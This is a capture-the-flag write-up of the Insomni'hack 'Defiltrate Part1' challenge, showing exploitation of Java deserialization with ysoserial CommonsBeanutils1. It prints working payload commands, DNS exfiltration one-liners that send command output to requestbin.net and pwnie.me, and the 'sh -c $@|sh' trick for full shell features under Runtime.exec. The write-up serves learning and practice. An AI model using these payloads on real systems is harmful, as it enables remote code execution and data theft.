# Defiltrate – Part1

## Description

Our company has been victim of a Ransomeware that damaged our "Secure share" website. Access to "Secure share" has been partially restored and traces of the malware have been deposited on it.

Can you help us retrieve our files?

http://defiltrate.insomnihack.ch/

## Task

Main POST request with vulnerability:

```
POST / HTTP/1.1
Host: defiltrate.insomnihack.ch
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Origin: https://defiltrate.insomnihack.ch
Connection: close
Referer: https://defiltrate.insomnihack.ch/
Cookie: PINKYID=3d736b46da3149f488c76295c7dece42
Upgrade-Insecure-Requests: 1

VIEW=rO0ABXNyAApXZWJTZXNzaW9uAAAAAAAAAAECAARMAAxtX2I2NFBheWxvYWR0ABJMamF2YS9sYW5nL1N0cmluZztMAAdtX2xvZ2lucQB%2bAAFMAAptX3Bhc3N3b3JkcQB%2bAAFMAAttX3Nlc3Npb25JRHEAfgABeHB0AARqYWNrdAAFYWRtaW50ABVJIGxvdmUgcGluayBwb25pZXMgPDN0AAI0Mg%3d%3d&get=&rm=
```


Here we can see that the VIEW parameter has a base64 encoded value starting with rO0AB which is the beginning of base64 encoded java serialized object:

First, we tried to view what the object holds, so we used a tool called [SerializationDumper](https://github.com/NickstaDB/SerializationDumper).

We got an object containing 4 properties, the first part of the deserialization output contains some information about the object and its properties (type,name,length,..etc), scrolling down the output we can see the values of the properties:

```
values
    m_b64Payload
    (object)
        TC_STRING - 0x74
        newHandle 0x00 7e 00 03
        Length - 0 - 0x00 00
        Value -  - 0x
    m_login
    (object)
        TC_STRING - 0x74
        newHandle 0x00 7e 00 04
        Length - 5 - 0x00 05
        Value - admin - 0x61646d696e
    m_password
    (object)
        TC_STRING - 0x74
        newHandle 0x00 7e 00 05
        Length - 21 - 0x00 15
        Value - I love pink ponies <3 - 0x49206c6f76652070696e6b20706f6e696573203c33
    m_sessionID
    (object)
        TC_STRING - 0x74
        newHandle 0x00 7e 00 06
        Length - 2 - 0x00 02
        Value - 42 - 0x3432
```

Trying the unsafe deserialization with ysoserial payload `CommonsBeanutils1` give the successful result.

```
java -jar ysoserial.jar CommonsBeanutils1 'curl empty.jack.su' | base64 -w0
```

### The solution 1

Source: https://r3billions.com/writeup-defiltrate-part1/

We got a DNS request to our bin, but in fact there was a firewall in place so we couldn't establish an OOB communication in a way other than DNS.

We started trying to execute commands using command substitution as subdomains to our DNS bin like $(whoami) or using back ticks but for some reason they were escaped (Cause Runtime.exec from CommonsBeanurils1 payload do tokenization of command and execute exec with arguments.) and sent as is without execution, we tried to use nslookup ourdns.com|bash sending a request to our DNS server with a customized response but the piping in this case didn't work too.

After some trial and error we could leak data using these 2 commands in separate payloads

```
python -c open('/tmp/exfilterate','w').write(__import__('os').popen('ls').read().replace('\n','-')[:62]+'.6ec8bf6181774bda185e.d.requestbin.net')
```

and

```
dig -f /tmp/exfilterate
```

Note: spaces were not allowed in the python payload for some reason so we replaced it with chr(32)

The first payload runs a python code that executes bash commands and appending the result to a DNS bin domain then writes it to a file. The second one executes a dig on the content of the file.

Executing the following command `grep -rnw '/' -e INS`

```
python -c open('/tmp/exfilterate','w').write(__import__('os').popen('grep'+chr(32)+'-rnw'+chr(32)+'/'+chr(32)+'-e'+chr(32)+'INS').read().replace('\n','-')+'.7d62a86d9d50bc553648.d.requestbin.net')
```

Resulted in a DNS request with the flag:


### The solution 2

Helpful links: 
- https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html?m=1
- https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Special-Parameters

If you happen to have command execution via Java's `Runtime.exec` on a Unix system, you may already have noticed that it doesn't behave like a normal shell. Although simple commands like `ls -al`, `uname -a`, or `netstat -ant` work fine, more complex commands and especially commands with indispensable features like pipes, redirections, quoting, or expansions do not work at all.

Well, the reason for that is that the command passed to `Runtime.exec` is not executed by a shell. Instead, if you dig down though the Java source code, you'll end up in the UNIXProcess class, which reveals that calling `Runtime.exec` results in a `fork` and `exec` call on Unix platforms.

So if we want execute bash command using `sh -c` we have to know the following:

That is correct, but here is the catch: Since only the first argument following `-c` is interpreted as shell command, the whole shell command must be passed as a single argument. And if you take a closer look at how the string passed to `Runtime.exec` is processed, you'll see that Java uses a `StringTokenizer` that **splits the command at any white-space character**.

So, what is the other option that we have?

The key is in the `sh -c command`, but we won't execute the command directly but build a command that itself spawns another shell that then executes our command. Though it sounds complicated, we'll derive it step by step.

The secret key to this is the [special parameter](http://www.gnu.org/software/bash/manual/bashref.html#Special-Parameters) `@`, which expands to the positional parameters when referenced with `$@`, starting from parameter one: `sh -c $@`

But how do we pass the actual command? Well, if the [shell is invoked
with `-c`](http://www.gnu.org/software/bash/manual/bashref.html#Invoking-Bash), any remaining arguments after the command argument are assigned to the positional parameters, starting with `$0`. So when `$@` is expanded by the shell with the following invocation:

    $ java Exec 'sh -c $@ 0 1 2 3 4 5'

It results in `1 2 3 4 5`. The 0-th parameter does not appear in the expansion result as it, by convention, should be the file name associated with the file being executed. We can see the result by adding a `echo` in place of the `$1` parameter:

    $ java Exec 'sh -c $@ 0 echo 1 2 3 4 5'

Here the shell first expands `$@` to `echo 1 2 3 4 5` and then executes it.

But this is still not better than the simple `sh -c command`, as we still have no support of pipes, redirections, quoting or expansion.

The reason for this is that the `$@` expansion does not result in a restart of the command interpretation.

The solution to a fully functional shell is `sh`\'s ability to allow the commands to be passed via standard input. So, if we use another `echo` to echo our command and pipe it to `sh`, we\'ll get our *command* executed by `sh` entirely:

    $ java Exec 'sh -c $@|sh . echo command'

Now we have all shell features available!

And we could create one line command to find flag in OS:

```
java -jar ysoserial.jar CommonsBeanutils1 'sh -c $@|sh . echo echo 0 > /tmp/exf; for cont in $(grep -r INS /opt/* 2>/dev/null); do echo $cont.69c0cdc3.pwnie.me >> /tmp/exf; done; dig -f /tmp/exf' | base64
```
